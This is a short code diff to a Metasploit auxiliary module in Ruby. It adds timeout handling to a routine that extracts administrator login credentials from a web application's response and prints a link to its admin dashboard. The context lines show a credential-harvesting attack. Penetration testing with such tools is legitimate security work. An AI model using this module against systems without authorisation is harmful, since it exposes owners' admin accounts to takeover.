@@ -69,6 +69,12 @@ class Metasploit3 < Msf::Auxiliary
 				cmd_var => cmd
 			}
 		})
+
+		if res.nil?
+			print_error("Connection timed out")
+			return "", "" # Empty username & password
+		end
+
 		creds = res.body.to_s.match(/.*:"(.*)";.*";/)[1]
 		return creds.split(":")
 	end
@@ -89,6 +95,7 @@ class Metasploit3 < Msf::Auxiliary
 				print_status("Found Version #{ver}")
 				session_id,cmd = setup_session()
 				user,pass = get_creds(session_id,cmd)
+				return if user.empty? and pass.empty?
 				print_good("Got creds. Login:#{user} Password:#{pass}")
 				print_good("Access the admin interface here: #{ip}:#{rport}#{target_uri.path}dashboard/")
 
